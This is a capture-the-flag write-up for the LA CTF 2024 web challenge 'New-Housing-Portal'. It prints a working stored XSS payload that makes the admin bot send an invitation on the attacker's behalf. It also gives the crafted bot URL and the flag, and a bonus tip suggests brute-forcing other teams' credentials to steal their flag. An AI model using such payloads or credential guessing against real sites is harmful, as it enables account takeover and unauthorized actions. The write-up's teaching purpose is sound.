---
title: New-Housing-Portal
date: 2024-02-18T20:05:23+02:00
description: Writeup for New-Housing-Portal [La ctf 2024]
author: H0N3YP0T
tags:
- web
draft: false
---
___

## Challenge Description

After that old portal, we decided to make a new one that is ultra secure and not based off any real housing sites. Can you make Samy tell you his deepest darkest secret?

## Intuition

When I register to the website I can exploit an XSS vulnerability on my username. In order to get the flag I need to get an invitation from
the admin. In order to force the admin to send me an invitation I probably have to use an SSRF vulnerability to make him use the invitation request API. 
To resume, I can use the XSS vulnerability chained with an SSRF to get the flag. The xss payload used to discover the vulnerability is the following:

```html
<img src=x onerror="alert('vulnerable')">
```

![XSS](/images/lactf_2024/xss.png)

## Solution

First I need to register using the following XSS payload as username:

```html
<img src=x onerror="var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/finder',true);
req.send();
function handleResponse(d) {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/finder', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('username=brole');
};">
```

The above payload use an SSRF exploit to call the invitation request API and send an invitation to the user `brole`.
Then, I will register another account which will receive the invitation of the admin (brole in this case). The next step is to 
use the admin bot link and send him the following link which is the URL to my XSS vulnerable profile:

```http request
https://new-housing-portal.chall.lac.tf/finder/?q=<img src=x onerror="var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/finder',true); req.send(); function handleResponse(d) {     var changeReq = new XMLHttpRequest();     changeReq.open('post', '/finder', true);     changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');     changeReq.send('username=brole'); };">

```
The bot will visit the profile and in background it will send the invitation to the user `brole`. After that, I will receive the invitation and I can use it to get the flag.

![XSS flag](/images/lactf_2024/secret.png)

### BONUS

A very smart way to find the flag (but smaller chance to succeed) is to brute force a very stupid username and password and
pray. If you are lucky enough you will find the credentials used by another team that already got the admin invitation and therefore
steal their flag 😈.

### Flag

`lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}`


